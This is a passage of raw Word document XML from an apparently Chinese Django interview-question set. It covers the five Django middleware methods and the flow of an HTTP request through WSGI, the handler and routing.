          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="0055AA"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>request_class</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>environ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A64C71" w14:textId="28A41FB2"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请求走到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>WSGIHandler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>类的时候，执行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>方法，将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>environ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>封装成了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
      <w:r w:rsidR="00FD3F5C">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CF5C20" w14:textId="2385C132" w:rsidR="00024E97" w:rsidRPr="00CF0D9D" w:rsidRDefault="00CF0D9D" w:rsidP="00CF0D9D">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083</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>列举</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中间件的</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>个方法，以及</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中间件的应用场景</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0DFFA2" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>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process_request : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求进来时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权限认证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3014B2AF" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>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process_view : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>路由匹配之后</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能够得到视图函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2517AC55" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>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process_exception : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>异常时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="183AFAAB" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>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process_template_response: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>模板渲染时执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29AF3808" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="70"/>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process_response : </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求有响应时执行</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="42055071" w14:textId="077A615C" w:rsidR="00024E97" w:rsidRPr="00CF0D9D" w:rsidRDefault="00CF0D9D" w:rsidP="00CF0D9D">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084</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>简述</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>对</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求的执行流程</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00CF0D9D">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60EBC81B"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在接受一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求之前的准备</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>需启动一个支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>网关协议的服务器监听端口等待外界的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求，比如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>自带的开发者服务器或者</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>uWSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器根据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议指定相应的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Handler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>来处理</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求。此时服务器已处于监听状态，可以接受外界的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>当一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求到达服务器的时候</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>,Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器根据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议从</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求中提取出必要的参数组成一个字典（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>environ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>）并传入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Handler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中进行处理。在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Handler</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>中对已经符合</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>协议标准规定的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>请求进行分析，比如加载</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>提供的中间件，路由分配，调用路由匹配的视图等。最后返回一个可以被浏览器解析的符合</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
